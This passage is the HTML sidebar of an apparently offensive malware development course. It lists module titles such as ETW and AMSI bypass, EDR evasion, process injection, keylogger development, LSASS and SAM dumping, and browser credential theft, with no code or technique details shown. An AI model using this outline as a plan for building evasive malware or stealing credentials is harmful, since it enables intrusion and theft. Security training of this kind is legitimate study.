            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./12.html">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Event Tracing For Windows - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./13.html">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Event Tracing For Windows - ETW Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./14.html">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Event Tracing For Windows - ETW Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./15.html">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Event Tracing for Windows - Improved Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./16.html">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Event Tracing for Windows - Patchless ETW Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./17.html">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Event Tracing For Windows - ETW Provider Session Hijacking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./18.html">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Antimalware Scan Interface - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./19.html">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Antimalware Scan Interface - AMSI Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./20.html">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Antimalware Scan Interface - AMSI Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./21.html">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Building a DRM-equipped Malware
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./22.html">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Introduction to Havoc C&amp;C
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./23.html">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 23 - Building An Evasive DLL Payload Loader
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./24.html">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Introduction To DLL Sideloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./25.html">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Practical DLL Sideloading Example
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./26.html">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - DLL Sideloading For EDR Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 27 - Bring Your Own Vulnerable Driver
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./28.html">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Local PE Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./29.html">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Reflective DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./30.html">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - PeFluctuation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./31.html">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 31 - Building a PE Packer
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./32.html">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Directory Placement
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./33.html">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Utilizing Fibers For Payload Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./34.html">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - TLS Callbacks For Anti-Debugging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./35.html">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Threadless Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./36.html">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Module Stomping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./37.html">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Module Overloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./38.html">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Process Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./39.html">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - Ghost Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./40.html">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Ghostly Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./41.html">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Herpaderping Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./42.html">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Herpaderply Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./43.html">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Shellcode Reflective DLL Injection (sRDI)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./44.html">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Patchless Threadless Injection Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./45.html">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Tampered Syscalls Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./46.html">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Exploiting EDRs For Evasion - Preventing EDR From Taking Action
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./47.html">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Exploiting EDRs For Evasion - EDR LOLBINS
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./48.html">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Hypnosis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./49.html">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Introduction To Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./50.html">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Writing Beacon Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./51.html">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - Object File Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./52.html">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - Exploiting EDRs For Evasion - Finding Internal Exclusion List
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./53.html">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - Introduction To Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./54.html">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - Introduction to Ekko and Zilean Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./55.html">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - Introduction to Foliage Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./56.html">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - Implementing Ekko With Stack Spoofing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./57.html">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - Token Manipulation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./58.html">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - Library Proxy Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./59.html">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - Heap Encryption With Ekko Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./60.html">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - Introduction To Executing .NET Assemblies 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./61.html">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - Evading Microsoft Defender Via Patching 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./62.html">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - .NET Assemblies - Patching System.Environment.Exit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./63.html">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Capturing And Saving Screenshots Into Memory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./64.html">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Cross-Architecture Injection: x86 to x64 Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./65.html">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - KnownDll Cache Poisoning Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./66.html">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Introduction to Keylogging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./67.html">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Developing a Keylogger
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./68.html">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Sending Keystrokes To Remote Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./69.html">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 69 - Manipulating VEH For Local Code Execution 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./70.html">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Introduction To LSASS Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./71.html">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Fetching LSASS Handle And Bypassing PPL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./72.html">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - LSASS Dump Via Handle Duplication
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./73.html">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - LSASS Dump Via RtlReportSilentProcessExit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./74.html">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - LSASS Dump Via Seclogon Race Condition
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./75.html">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 75 - Dumping The SAM Database
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./76.html">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Dumping The SAM Remotely
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./77.html">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Dumping The SAM From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./78.html">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - Domain Enumeration Using MS-SAMR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./79.html">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - Dumping Browser Cookies: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./80.html">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - Dumping Saved Logins: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 81 - Dumping Browser Cookies: Chrome
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Dumping Saved Logins: Chrome
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./22.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
